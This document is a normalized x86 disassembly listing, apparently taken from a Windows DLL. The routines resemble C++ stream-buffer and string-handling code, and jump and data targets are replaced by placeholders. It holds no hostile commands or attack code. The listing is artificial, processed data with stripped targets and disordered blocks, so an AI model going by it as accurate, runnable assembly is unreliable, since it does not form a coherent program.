mov edx [ esi + 0x3c ]
cmp edi edx
jae r-xdata
test [ esi + 0x40 ] 0x2
jne r-xdata
mov ecx [ esi + 0x34 ]
mov ebx [ ecx ]
mov edx edi
add ebx edx
cmp edx ebx
jae r-xdata
pop edi
pop esi
leave
retn 0x4
mov eax [ esi + 0x34 ]
mov eax [ eax ]
add eax edi
mov [ ecx ] edx
mov ecx [ esi + 0x34 ]
sub eax edx
mov [ ecx ] eax
or eax 0xffffffff
jmp r-xdata
test edi edi
jne r-xdata
dec [ ecx ]
mov esi [ esi + 0x24 ]
mov ecx [ esi ]
lea edx [ ecx + 0x1 ]
mov [ esi ] edx
jmp r-xdata
pop ebx
mov eax [ esi + 0x34 ]
mov ecx [ esi + 0x10 ]
mov ebx [ eax ]
sub ebx [ ecx ]
add ebx edi
xor ebx ebx
jmp r-xdata
mov [ ecx ] al
test eax eax
jbe r-xdata
push 0x20
pop eax
jmp r-xdata
mov eax ebx
shr eax 0x1
cmp eax 0x20
jae r-xdata
jne r-xdata
mov ecx 0x7fffffff
sub ecx eax
cmp ecx ebx
jae r-xdata
add eax ebx
push 0x0
push eax
mov [ ebp - 0x4 ] eax
call sub_100022a2
mov edi eax
mov eax [ esi + 0x10 ]
mov edx [ eax ]
pop ecx
pop ecx
mov [ ebp - 0x8 ] edx
test ebx ebx
jbe r-xdata
test eax eax
shr eax 0x1
jne r-xdata
jne r-xdata
push ebx
push edx
push [ ebp - 0x4 ]
push edi
call sub_10002477
mov edx [ ebp - 0x8 ]
add esp 0x10
test ebx ebx
mov ecx [ esi + 0x14 ]
mov eax edi
sub eax edx
add [ esi + 0x3c ] eax
mov eax [ esi + 0x24 ]
mov eax [ eax ]
mov ebx edi
sub eax edx
sub ebx edx
add [ ecx ] ebx
mov ecx [ esi + 0x24 ]
add eax edi
mov [ ecx ] eax
mov ecx edi
sub ecx eax
add ecx [ ebp - 0x4 ]
mov eax [ esi + 0x34 ]
mov [ eax ] ecx
test [ esi + 0x40 ] 0x4
je r-xdata
mov eax [ esi + 0x14 ]
mov ecx [ ebp - 0x4 ]
mov [ esi + 0x3c ] edi
mov [ eax ] edi
mov eax [ esi + 0x24 ]
mov [ eax ] edi
mov eax [ esi + 0x34 ]
mov [ eax ] ecx
mov eax [ esi + 0x10 ]
test [ esi + 0x40 ] 0x4
mov [ eax ] edi
mov eax [ esi + 0x20 ]
jne r-xdata
mov eax [ esi + 0x24 ]
mov ecx [ eax ]
mov eax [ esi + 0x20 ]
mov eax [ eax ]
mov ebx [ esi + 0x10 ]
sub eax edx
add eax edi
mov [ ebx ] edi
mov edi [ esi + 0x20 ]
sub ecx eax
mov [ edi ] eax
mov eax [ esi + 0x30 ]
inc ecx
mov [ eax ] ecx
mov eax [ esi + 0x10 ]
mov [ eax ] edi
mov eax [ esi + 0x20 ]
and [ eax ] 0x0
mov eax [ esi + 0x30 ]
mov [ eax ] edi
jmp r-xdata
mov [ eax ] edi
mov eax [ esi + 0x30 ]
mov [ eax ] 0x1
jmp r-xdata
mov eax [ esi + 0x34 ]
or [ esi + 0x40 ] 0x1
dec [ eax ]
mov esi [ esi + 0x24 ]
mov ecx [ esi ]
lea eax [ ecx + 0x1 ]
mov [ esi ] eax
mov eax [ ebp + 0x8 ]
push edx
call sub_1002004f
pop ecx
test [ esi + 0x40 ] 0x1
je r-xdata
sub_1000c6a1
mov eax [ ecx + 0x20 ]
mov eax [ eax ]
test eax eax
je r-xdata
or eax 0xffffffff
mov edx [ ecx + 0x10 ]
cmp eax [ edx ]
jbe r-xdata
mov edx [ esp + 0x4 ]
cmp edx 0xffffffff
je r-xdata
mov eax [ ecx + 0x30 ]
inc [ eax ]
mov eax [ ecx + 0x20 ]
dec [ eax ]
cmp edx 0xffffffff
je r-xdata
cmp dl [ eax - 0x1 ]
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ecx + 0x20 ]
mov eax [ eax ]
mov [ eax ] dl
mov eax edx
jmp r-xdata
test [ ecx + 0x40 ] 0x2
jne r-xdata
retn 0x4
sub_1000c6e9
mov eax [ ecx + 0x20 ]
push edi
mov edi [ eax ]
test edi edi
jne r-xdata
mov edx [ ecx + 0x30 ]
push ebx
mov ebx [ edx ]
push esi
mov esi edi
add ebx esi
cmp esi ebx
jae r-xdata
or eax 0xffffffff
pop edi
retn
test [ ecx + 0x40 ] 0x4
jne r-xdata
movzx eax [ edi ]
jmp r-xdata
or eax 0xffffffff
mov esi [ ecx + 0x24 ]
mov esi [ esi ]
test esi esi
je r-xdata
pop esi
pop ebx
pop edi
retn
cmp esi edi
ja r-xdata
cmp [ ecx + 0x3c ] esi
jae r-xdata
cmp [ ecx + 0x3c ] edi
jbe r-xdata
mov esi [ eax ]
mov eax [ ecx + 0x3c ]
sub eax esi
mov [ edx ] eax
mov eax [ ecx + 0x20 ]
mov eax [ eax ]
movzx eax [ eax ]
jmp r-xdata
mov [ ecx + 0x3c ] esi
sub_1000c746
push ebp
mov ebp esp
mov edx [ ecx + 0x24 ]
mov eax [ edx ]
test eax eax
je r-xdata
test [ ebp + 0x14 ] 0x1
push ebx
push esi
push edi
je r-xdata
cmp [ ecx + 0x3c ] eax
jae r-xdata
test [ ebp + 0x14 ] 0x2
je r-xdata
mov eax [ ecx + 0x20 ]
mov edi [ eax ]
test edi edi
je r-xdata
mov [ ecx + 0x3c ] eax
mov esi [ r--data ]
mov edx [ edx ]
test edx edx
je r-xdata
cmp [ ebp + 0x10 ] 0x2
mov edx [ r--data ]
jne r-xdata
cmp [ ebp + 0x10 ] 0x2
mov edi [ r--data ]
jne r-xdata
cmp [ ebp + 0x10 ] 0x1
jne r-xdata
mov ebx [ ecx + 0x3c ]
jmp r-xdata
cmp [ ebp + 0x10 ] 0x1
jne r-xdata
mov ebx [ ecx + 0x3c ]
jmp r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
test [ ebp + 0x14 ] 0x2
jne r-xdata
mov eax [ ecx + 0x10 ]
sub ebx [ eax ]
mov esi [ ebp + 0xc ]
add esi ebx
jmp r-xdata
cmp [ ebp + 0x10 ] 0x0
mov esi edi
jne r-xdata
mov ebx edx
mov eax [ ecx + 0x10 ]
sub ebx [ eax ]
mov esi [ ebp + 0xc ]
add esi ebx
jmp r-xdata
mov esi [ ebp + 0xc ]
mov esi edx
jmp r-xdata
mov ebx edi
test esi esi
jl r-xdata
test esi esi
jl r-xdata
mov esi [ ebp + 0xc ]
mov esi edx
jmp r-xdata
mov eax [ ecx + 0x10 ]
mov eax [ eax ]
mov ebx [ ecx + 0x3c ]
sub ebx eax
cmp esi ebx
jg r-xdata
mov esi edi
jmp r-xdata
mov eax [ ecx + 0x10 ]
mov eax [ eax ]
mov ebx [ ecx + 0x3c ]
sub ebx eax
cmp esi ebx
jg r-xdata
mov eax [ ebp + 0x8 ]
pop edi
xor ecx ecx
mov [ eax ] esi
pop esi
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
mov [ eax + 0x10 ] ecx
pop ebx
pop ebp
retn 0x10
mov edx [ ecx + 0x30 ]
sub eax edi
add eax esi
sub [ edx ] eax
mov edx [ ecx + 0x20 ]
add [ edx ] eax
test [ ebp + 0x14 ] 0x2
je r-xdata
sub eax edx
mov edx [ ecx + 0x34 ]
add eax esi
sub [ edx ] eax
mov ecx [ ecx + 0x24 ]
add [ ecx ] eax
jmp r-xdata
mov edx [ ecx + 0x24 ]
mov ebx [ edx ]
test ebx ebx
je r-xdata
mov eax [ ecx + 0x20 ]
mov edi [ eax ]
mov eax [ ecx + 0x34 ]
mov eax [ eax ]
add eax ebx
mov [ edx ] edi
mov ecx [ ecx + 0x34 ]
sub eax edi
mov [ ecx ] eax
jmp r-xdata
sub_1000c87d
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
mov edx [ ebp + 0x14 ]
push esi
lea esi [ edx + eax ]
mov eax [ ecx + 0x24 ]
mov edx [ eax ]
push edi
test edx edx
je r-xdata
mov edi [ r--data ]
cmp esi edi
je r-xdata
cmp [ ecx + 0x3c ] edx
jae r-xdata
mov eax [ ebp + 0x8 ]
xor ecx ecx
pop edi
mov [ eax ] esi
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
mov [ eax + 0x10 ] ecx
pop esi
pop ebp
retn 0x20
test [ ebp + 0x24 ] 0x1
push ebx
je r-xdata
mov [ ecx + 0x3c ] edx
test [ ebp + 0x24 ] 0x2
je r-xdata
mov edx [ ecx + 0x20 ]
mov edx [ edx ]
test edx edx
je r-xdata
mov esi edi
mov edx [ eax ]
test edx edx
je r-xdata
test esi esi
jl r-xdata
test esi esi
jl r-xdata
mov eax [ ecx + 0x10 ]
mov eax [ eax ]
mov ebx [ ecx + 0x3c ]
sub ebx eax
cmp esi ebx
jg r-xdata
mov eax [ ecx + 0x10 ]
mov eax [ eax ]
mov ebx [ ecx + 0x3c ]
sub ebx eax
cmp esi ebx
jg r-xdata
sub eax edx
mov edx [ ecx + 0x30 ]
add eax esi
sub [ edx ] eax
mov edx [ ecx + 0x20 ]
add [ edx ] eax
test [ ebp + 0x24 ] 0x2
je r-xdata
sub eax edx
mov edx [ ecx + 0x34 ]
add eax esi
sub [ edx ] eax
mov ecx [ ecx + 0x24 ]
add [ ecx ] eax
jmp r-xdata
pop ebx
mov edx [ ecx + 0x24 ]
mov ebx [ edx ]
test ebx ebx
je r-xdata
mov eax [ ecx + 0x20 ]
mov edi [ eax ]
mov eax [ ecx + 0x34 ]
mov eax [ eax ]
add eax ebx
mov [ edx ] edi
mov ecx [ ecx + 0x34 ]
sub eax edi
mov [ ecx ] eax
jmp r-xdata
sub_1000c966
push esi
push edi
lea edi [ ecx - 0xc ]
lea esi [ edi + 0xc ]
mov ecx esi
call sub_1000c490
push esi
mov [ esi ] r--data
call sub_1001b129
test [ esp + 0x10 ] 0x1
pop ecx
je r-xdata
mov eax edi
pop edi
pop esi
retn 0x4
push edi
call sub_1002004f
pop ecx
sub_1000c9b3
push 0x10
mov eax sub_1004a744
call sub_10023e66
mov edi [ ebp + 0x8 ]
xor ebx ebx
mov [ edi + 0x4 ] ebx
mov eax [ edi ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi + 0x28 ]
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x1c ] edi
cmp eax ebx
je r-xdata
mov [ ebp - 0x4 ] ebx
call sub_1000d70f
mov [ ebp - 0x18 ] al
xor esi esi
inc esi
mov [ ebp - 0x4 ] esi
cmp al bl
je r-xdata
lea ecx [ eax + 0x4 ]
call sub_1001b0a5
mov eax [ edi ]
mov edx [ eax + 0x4 ]
add edx edi
cmp [ ebp - 0x14 ] ebx
je r-xdata
push [ ebp + 0x10 ]
mov [ ebp - 0x4 ] 0x2
mov eax [ edi ]
mov eax [ eax + 0x4 ]
mov ecx [ eax + edi + 0x28 ]
mov eax [ ecx ]
push 0xffffffff
push [ ebp + 0xc ]
call [ eax + 0x1c ]
add [ edi + 0x4 ] eax
cmp eax [ ebp + 0x10 ]
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov eax [ edi ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi + 0x28 ]
cmp eax ebx
je r-xdata
push ebx
push [ ebp - 0x14 ]
call sub_10007e2d
mov [ ebp - 0x4 ] esi
jmp r-xdata
mov [ ebp - 0x14 ] 0x3
mov eax edi
call sub_10023f0b
retn 0xc
lea ecx [ eax + 0x4 ]
call sub_1001b0ae
sub_1000ca25
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
mov eax [ eax + 0x4 ]
add eax ecx
mov ecx [ eax + 0x8 ]
or ecx 0x4
cmp [ eax + 0x28 ] 0x0
jne r-xdata
xor esi esi
inc esi
push esi
push eax
call sub_10007d13
mov [ ebp - 0x4 ] esi
mov eax r-xdata
retn
or ecx 0x4
sub_1000ca8e
push 0x4
mov eax sub_10049f15
call sub_10023e33
mov esi [ ebp + 0x8 ]
push [ ebp + 0xc ]
and [ ebp - 0x10 ] 0x0
push esi
call sub_1000cace
mov eax [ esi + 0x8 ]
mov eax [ eax + 0x4 ]
mov [ esi + eax + 0x8 ] r--data
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov [ esi + eax ] r--data
mov eax esi
call sub_10023f0b
retn 0x8
sub_1000cace
push 0x4
mov eax sub_10049eef
call sub_10023e33
mov esi [ ebp + 0x8 ]
and [ ebp - 0x10 ] 0x0
mov eax [ esi ]
mov eax [ eax + 0x4 ]
push [ ebp + 0xc ]
mov [ esi + eax ] r--data
mov eax [ esi ]
and [ esi + 0x4 ] 0x0
mov ecx [ eax + 0x4 ]
add ecx esi
call sub_1000cbd9
mov eax esi
call sub_10023f0b
retn 0x8
sub_1000cb0a
push 0x0
mov eax sub_10048949
call sub_10023e33
mov esi [ ebp + 0x8 ]
lea ecx [ esi + 0x4 ]
mov [ esi ] r--data
call sub_1001b074
and [ ebp - 0x4 ] 0x0
push 0x4
call sub_10020186
pop ecx
test eax eax
je r-xdata
xor eax eax
mov ecx eax
call sub_1000710a
jmp r-xdata
mov [ esi + 0x38 ] eax
mov eax esi
call sub_1000cc45
mov eax esi
call sub_10023f0b
retn 0x4
sub_1000cb56
mov eax [ esi + 0x40 ]
and eax 0x6
cmp al 0x6
je r-xdata
retn 0x4
push edi
push 0x0
push ebx
call sub_100022a2
push ebx
push [ esp + 0x14 ]
mov edi eax
push ebx
push edi
call sub_10002477
add esp 0x18
test [ esi + 0x40 ] 0x4
lea eax [ edi + ebx ]
mov [ esi + 0x3c ] eax
jne r-xdata
mov ecx [ esi + 0x40 ]
test cl 0x2
jne r-xdata
mov ecx [ esi + 0x10 ]
mov [ ecx ] edi
mov ecx [ esi + 0x20 ]
mov [ ecx ] edi
mov ecx [ esi + 0x30 ]
mov [ ecx ] ebx
or [ esi + 0x40 ] 0x1
pop edi
test cl 0x10
jne r-xdata
mov ecx [ esi + 0x14 ]
mov [ ecx ] edi
mov ecx [ esi + 0x24 ]
mov [ ecx ] eax
mov ecx edi
sub ecx eax
mov eax [ esi + 0x34 ]
add ecx ebx
mov [ eax ] ecx
mov eax [ esi + 0x20 ]
cmp [ eax ] 0x0
jne r-xdata
mov eax edi
mov eax [ esi + 0x10 ]
mov [ eax ] edi
mov eax [ esi + 0x20 ]
and [ eax ] 0x0
mov eax [ esi + 0x30 ]
mov [ eax ] edi
sub_1000cbd9
push 0x0
mov eax sub_10049ed4
call sub_10023e33
mov esi ecx
call sub_10006f2b
mov eax [ ebp + 0x8 ]
mov [ esi + 0x28 ] eax
lea eax [ ebp + 0x8 ]
xor ebx ebx
push eax
mov ecx esi
mov [ esi + 0x2c ] ebx
call sub_10007b59
push eax
mov [ ebp - 0x4 ] ebx
call sub_1000d625
or [ ebp - 0x4 ] 0xffffffff
pop ecx
lea ecx [ ebp + 0x8 ]
mov edi eax
call sub_10007b41
mov eax [ edi ]
push 0x20
mov ecx edi
call [ eax + 0x18 ]
mov [ esi + 0x30 ] al
cmp [ esi + 0x28 ] ebx
jne r-xdata
mov [ esi + 0x4 ] ebx
call sub_10023f0b
retn 0x4
mov eax [ esi + 0x8 ]
or eax 0x4
push ebx
push esi
mov ecx eax
call sub_10007d13
sub_1000cc45
lea edx [ eax + 0x18 ]
mov [ eax + 0x20 ] edx
lea edx [ eax + 0x1c ]
mov [ eax + 0x24 ] edx
lea edx [ eax + 0x28 ]
mov [ eax + 0x30 ] edx
lea ecx [ eax + 0x8 ]
mov [ eax + 0x10 ] ecx
lea edx [ eax + 0x2c ]
mov [ eax + 0x34 ] edx
xor edx edx
lea ecx [ eax + 0xc ]
mov [ eax + 0x14 ] ecx
mov [ ecx ] edx
mov ecx [ eax + 0x24 ]
mov [ ecx ] edx
mov ecx [ eax + 0x34 ]
mov [ ecx ] edx
mov ecx [ eax + 0x10 ]
mov [ ecx ] edx
mov ecx [ eax + 0x20 ]
mov [ ecx ] edx
mov eax [ eax + 0x30 ]
mov [ eax ] edx
retn
sub_1000cc87
push 0x4
mov eax sub_1004a42e
call sub_10023e33
mov esi ecx
mov [ ebp - 0x10 ] esi
call sub_10001b23
and [ ebp - 0x4 ] 0x0
call sub_1001ec70
push [ eax ]
push esi
push [ ebp + 0x8 ]
call sub_1000cd18
add esp 0xc
mov eax esi
call sub_10023f0b
retn 0x8
sub_1000ccbe
push 0x0
mov eax sub_10048e25
call sub_10023e33
mov ecx [ ebp + 0x8 ]
call sub_10001b23
and [ ebp - 0x4 ] 0x0
call sub_1001ec70
push [ eax ]
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_1001c910
mov eax [ ebp + 0x8 ]
add esp 0xc
call sub_10023f0b
retn 0x8
sub_1000ccf6
push esi
push [ esp + 0x8 ]
mov esi ecx
call sub_10020428
pop ecx
push eax
push [ esp + 0xc ]
mov ecx esi
push [ esi + 0x14 ]
push 0x0
call sub_10006c07
pop esi
retn 0x4
sub_1000cd18
push ebp
mov ebp esp
sub esp 0x10
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi [ edi + 0x14 ]
test esi esi
je r-xdata
pop edi
pop esi
leave
retn
lea eax [ ebp - 0x8 ]
push eax
mov ecx edi
call sub_10007b6c
mov ecx eax
call sub_10006cbe
lea esi [ eax + esi * 2 ]
lea eax [ ebp - 0x10 ]
push eax
mov ecx edi
call sub_10007b6c
mov ecx eax
call sub_10006cbe
mov ecx [ ebp + 0xc ]
push esi
push eax
call sub_1000d357
sub_1000cd5f
push 0x4
mov eax sub_10048843
call sub_10023e66
mov esi ecx
and [ esi ] 0x0
and [ ebp - 0x4 ] 0x0
push 0x10
call sub_10020186
pop ecx
test eax eax
je r-xdata
xor eax eax
xor ecx ecx
inc ecx
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] ecx
mov ecx [ ebp + 0x8 ]
mov [ eax ] r--data
mov [ eax + 0xc ] ecx
jmp r-xdata
mov [ esi ] eax
mov eax esi
call sub_10023f0b
retn 0x4
sub_1000cdd9
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi ecx
cmp [ edi + 0x14 ] esi
jb r-xdata
call sub_1001b037
mov eax [ ebp + 0x10 ]
mov eax [ eax + 0x14 ]
cmp eax [ ebp + 0x14 ]
jae r-xdata
mov ecx [ edi + 0x14 ]
mov eax ecx
sub eax esi
cmp eax [ ebp + 0xc ]
jae r-xdata
mov eax [ ebp + 0x10 ]
mov eax [ eax + 0x14 ]
sub eax [ ebp + 0x14 ]
mov ebx [ ebp + 0x18 ]
cmp eax ebx
jae r-xdata
mov [ ebp + 0xc ] eax
sub ecx [ ebp + 0xc ]
or eax 0xffffffff
sub eax ebx
cmp eax ecx
ja r-xdata
mov ebx eax
mov ecx [ edi + 0x14 ]
mov eax ecx
sub eax [ ebp + 0xc ]
mov edx ecx
sub edx esi
sub edx [ ebp + 0xc ]
add eax ebx
mov [ ebp + 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp ecx eax
jae r-xdata
call sub_1001afff
cmp edi [ ebp + 0x10 ]
je r-xdata
push 0x0
push eax
mov ecx edi
call sub_10001fc4
mov edx [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
cmp ebx eax
ja r-xdata
mov eax [ edi + 0x18 ]
cmp eax 0x8
jb r-xdata
cmp [ ebp + 0x14 ] esi
ja r-xdata
mov eax [ edi + 0x18 ]
cmp eax 0x8
jb r-xdata
lea ecx [ edi + 0x4 ]
mov ecx [ edi + 0x4 ]
jmp r-xdata
add eax esi
cmp eax [ ebp + 0x14 ]
mov [ ebp + 0x18 ] eax
mov eax [ edi + 0x18 ]
ja r-xdata
mov eax [ edi + 0x18 ]
cmp eax 0x8
jb r-xdata
lea ecx [ edi + 0x4 ]
mov ecx [ edi + 0x4 ]
jmp r-xdata
lea ecx [ edi + 0x4 ]
mov ecx [ edi + 0x4 ]
jmp r-xdata
mov [ ebp + 0x8 ] ecx
cmp eax 0x8
jb r-xdata
cmp eax 0x8
jb r-xdata
cmp eax 0x8
jb r-xdata
lea ecx [ edi + 0x4 ]
mov ecx [ edi + 0x4 ]
jmp r-xdata
lea edx [ edi + 0x4 ]
mov edx [ edi + 0x4 ]
jmp r-xdata
cmp eax 0x8
jb r-xdata
lea edx [ eax + 0x4 ]
mov edx [ eax + 0x4 ]
jmp r-xdata
mov [ ebp + 0x18 ] ecx
mov ecx [ ebp + 0xc ]
push edx
mov edx [ ebp + 0x8 ]
add ecx esi
sub eax esi
lea ecx [ edx + ecx * 2 ]
push ecx
mov ecx [ ebp + 0x18 ]
sub eax ebx
push eax
lea eax [ esi + ebx ]
lea eax [ ecx + eax * 2 ]
push eax
call sub_10001def
mov eax [ ebp + 0x10 ]
add esp 0x10
cmp [ eax + 0x18 ] 0x8
jb r-xdata
lea edx [ edi + 0x4 ]
mov edx [ edi + 0x4 ]
jmp r-xdata
lea ecx [ edi + 0x4 ]
mov ecx [ edi + 0x4 ]
jmp r-xdata
lea ecx [ edi + 0x4 ]
mov ecx [ edi + 0x4 ]
jmp r-xdata
mov [ ebp + 0x10 ] ecx
cmp eax 0x8
jb r-xdata
lea ecx [ edi + 0x4 ]
mov ecx [ edi + 0x4 ]
jmp r-xdata
mov [ ebp + 0x10 ] edx
mov edx [ ebp + 0x14 ]
push ebx
lea ecx [ ecx + edx * 2 ]
sub eax esi
push ecx
push eax
mov eax [ ebp + 0x10 ]
lea eax [ eax + esi * 2 ]
push eax
call sub_10001def
mov eax [ edi + 0x18 ]
add esp 0x10
cmp eax 0x8
jb r-xdata
lea ecx [ edi + 0x4 ]
mov ecx [ edi + 0x4 ]
jmp r-xdata
mov eax [ edi + 0x18 ]
cmp eax 0x8
jb r-xdata
lea ecx [ edi + 0x4 ]
mov ecx [ edi + 0x4 ]
jmp r-xdata
cmp eax 0x8
jb r-xdata
lea edx [ edi + 0x4 ]
mov edx [ edi + 0x4 ]
jmp r-xdata
cmp eax 0x8
jb r-xdata
lea edx [ edi + 0x4 ]
mov edx [ edi + 0x4 ]
jmp r-xdata
mov [ ebp + 0x8 ] ecx
mov ecx [ ebp + 0xc ]
push edx
mov edx [ ebp + 0x10 ]
add ecx esi
sub eax esi
lea ecx [ edx + ecx * 2 ]
push ecx
mov ecx [ ebp + 0x8 ]
sub eax ebx
push eax
lea eax [ esi + ebx ]
lea eax [ ecx + eax * 2 ]
push eax
call sub_10001def
mov eax [ edi + 0x18 ]
add esp 0x10
cmp eax 0x8
jb r-xdata
lea edx [ edi + 0x4 ]
mov edx [ edi + 0x4 ]
jmp r-xdata
cmp eax 0x8
jb r-xdata
add esp 0x10
push [ ebp - 0x4 ]
mov ecx edi
call sub_10002579
mov eax edi
pop edi
pop esi
pop ebx
leave
retn 0x14
push ebx
mov ebx [ ebp + 0x14 ]
lea edx [ edx + ebx * 2 ]
push edx
sub eax esi
push eax
lea eax [ ecx + esi * 2 ]
push eax
call sub_1000255d
jmp r-xdata
lea edx [ edi + 0x4 ]
mov edx [ edi + 0x4 ]
jmp r-xdata
push [ ebp + 0xc ]
mov [ ebp + 0x10 ] ecx
mov ecx [ ebp + 0x14 ]
lea ecx [ edx + ecx * 2 ]
sub eax esi
push ecx
push eax
mov eax [ ebp + 0x10 ]
lea eax [ eax + esi * 2 ]
push eax
call sub_10001def
mov eax [ edi + 0x18 ]
add esp 0x10
cmp eax 0x8
jb r-xdata
lea ecx [ edi + 0x4 ]
mov ecx [ edi + 0x4 ]
jmp r-xdata
push [ ebp + 0x8 ]
mov [ ebp + 0x10 ] edx
mov edx [ ebp + 0x18 ]
sub eax esi
lea ecx [ ecx + edx * 2 ]
push ecx
mov ecx [ ebp + 0x10 ]
sub eax ebx
push eax
lea eax [ esi + ebx ]
lea eax [ ecx + eax * 2 ]
push eax
call sub_10001def
mov eax [ edi + 0x18 ]
add esp 0x10
cmp eax 0x8
jb r-xdata
lea ecx [ edi + 0x4 ]
mov ecx [ edi + 0x4 ]
jmp r-xdata
cmp eax 0x8
jb r-xdata
push eax
call sub_10001def
push [ ebp + 0x8 ]
mov [ ebp + 0x14 ] edx
mov edx [ ebp + 0xc ]
add edx esi
sub eax esi
sub eax ebx
lea ecx [ ecx + edx * 2 ]
push ecx
push eax
mov eax [ ebp + 0x14 ]
add esi ebx
lea eax [ eax + esi * 2 ]
jmp r-xdata
lea ecx [ edi + 0x4 ]
mov ecx [ edi + 0x4 ]
jmp r-xdata
cmp eax 0x8
jb r-xdata
lea edx [ edi + 0x4 ]
mov edx [ edi + 0x4 ]
jmp r-xdata
mov [ ebp + 0x10 ] ecx
cmp eax 0x8
jb r-xdata
push ebx
mov ebx [ ebp + 0x14 ]
lea edx [ edx + ebx * 2 ]
sub eax esi
push edx
push eax
lea eax [ ecx + esi * 2 ]
jmp r-xdata
lea ecx [ edi + 0x4 ]
mov ecx [ edi + 0x4 ]
jmp r-xdata
push [ ebp + 0x8 ]
mov [ ebp + 0x10 ] ecx
mov ecx [ ebp + 0xc ]
add ecx esi
add ecx ecx
mov [ ebp + 0x18 ] ecx
sub eax esi
add ecx edx
push ecx
mov ecx [ ebp + 0x10 ]
sub eax ebx
push eax
lea eax [ esi + ebx ]
lea eax [ ecx + eax * 2 ]
push eax
call sub_10001def
mov eax [ edi + 0x18 ]
add esp 0x10
cmp eax 0x8
jb r-xdata
mov ecx [ ebp + 0x14 ]
sub ecx [ ebp + 0xc ]
push ebx
add ecx ebx
mov ebx [ ebp + 0x10 ]
lea ecx [ ebx + ecx * 2 ]
sub eax esi
push ecx
push eax
lea eax [ edx + esi * 2 ]
jmp r-xdata
lea ecx [ edi + 0x4 ]
mov ecx [ edi + 0x4 ]
jmp r-xdata
mov [ ebp + 0x10 ] ecx
cmp eax 0x8
jb r-xdata
mov edx ebx
sub edx [ ebp + 0xc ]
sub eax esi
sub eax [ ebp + 0xc ]
push edx
mov edx [ ebp + 0x14 ]
add edx ebx
mov ebx [ ebp + 0x10 ]
lea edx [ ebx + edx * 2 ]
push edx
push eax
mov eax [ ebp + 0x18 ]
add eax ecx
sub_1000d138
push ebp
mov ebp esp
push ecx
push esi
push edi
mov edi [ ebp + 0x10 ]
push edi
mov esi ecx
call sub_10001c8c
test al al
je r-xdata
mov edi [ ebp + 0x8 ]
cmp [ esi + 0x14 ] edi
jae r-xdata
cmp [ esi + 0x18 ] 0x8
jb r-xdata
mov eax [ esi + 0x14 ]
mov ecx eax
sub ecx edi
cmp ecx [ ebp + 0xc ]
jae r-xdata
call sub_1001b037
lea eax [ esi + 0x4 ]
mov eax [ esi + 0x4 ]
jmp r-xdata
sub eax [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x14 ]
or ecx 0xffffffff
sub ecx ebx
cmp ecx eax
ja r-xdata
mov [ ebp + 0xc ] ecx
pop edi
pop esi
leave
retn 0x10
push [ ebp + 0x14 ]
sub edi eax
sar edi 0x1
push edi
push esi
push [ ebp + 0xc ]
mov ecx esi
push [ ebp + 0x8 ]
call sub_1000cdd9
jmp r-xdata
mov ecx [ esi + 0x14 ]
sub ecx edi
sub ecx [ ebp + 0xc ]
mov [ ebp - 0x4 ] ecx
cmp ebx [ ebp + 0xc ]
jae r-xdata
call sub_1001afff
test ebx ebx
ja r-xdata
mov eax [ esi + 0x18 ]
cmp eax 0x8
jb r-xdata
mov eax [ esi + 0x14 ]
sub eax [ ebp + 0xc ]
push 0x0
add eax ebx
push eax
mov ecx esi
mov [ ebp + 0x14 ] eax
call sub_10001fc4
test al al
je r-xdata
cmp [ ebp + 0xc ] 0x0
jbe r-xdata
lea edx [ esi + 0x4 ]
mov edx [ esi + 0x4 ]
jmp r-xdata
mov eax esi
pop ebx
cmp [ ebp + 0xc ] ebx
jae r-xdata
lea edx [ esi + 0x4 ]
mov edx [ esi + 0x4 ]
jmp r-xdata
mov [ ebp + 0x8 ] edx
cmp eax 0x8
jb r-xdata
mov eax [ esi + 0x18 ]
cmp eax 0x8
jb r-xdata
mov eax [ esi + 0x18 ]
lea ecx [ esi + 0x4 ]
cmp eax 0x8
jb r-xdata
push ecx
mov ecx [ ebp + 0xc ]
mov [ ebp + 0x14 ] edx
mov edx [ ebp + 0x8 ]
add ecx edi
sub eax edi
lea ecx [ edx + ecx * 2 ]
push ecx
mov ecx [ ebp + 0x14 ]
sub eax ebx
push eax
lea eax [ edi + ebx ]
lea eax [ ecx + eax * 2 ]
push eax
call sub_10001def
add esp 0x10
lea ecx [ esi + 0x4 ]
mov ecx [ esi + 0x4 ]
jmp r-xdata
mov edx ecx
mov edx [ ecx ]
jmp r-xdata
push ebx
push [ ebp + 0x10 ]
sub eax edi
push eax
lea eax [ ecx + edi * 2 ]
push eax
call sub_1000255d
add esp 0x10
push [ ebp + 0x14 ]
mov ecx esi
call sub_10002579
push [ ebp - 0x4 ]
mov [ ebp + 0x8 ] ecx
mov ecx [ ebp + 0xc ]
add ecx edi
sub eax edi
lea ecx [ edx + ecx * 2 ]
push ecx
mov ecx [ ebp + 0x8 ]
sub eax ebx
push eax
lea eax [ edi + ebx ]
lea eax [ ecx + eax * 2 ]
push eax
call sub_10001def
add esp 0x10
mov ecx [ ecx ]
cmp eax 0x8
jb r-xdata
sub_1000d2b5
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0xc
push ebx
push esi
mov esi [ ebp + 0x1c ]
push edi
lea eax [ esp + 0x10 ]
mov ebx ecx
push eax
mov [ esp + 0x10 ] ebx
call sub_10007b6c
cmp [ ebp + 0x18 ] esi
jne r-xdata
sub esi [ ebp + 0x18 ]
mov edi [ eax ]
mov ebx [ eax + 0x4 ]
sar esi 0x1
push esi
push [ ebp + 0x18 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
call sub_1000d29e
add esp 0x10
push eax
push ebx
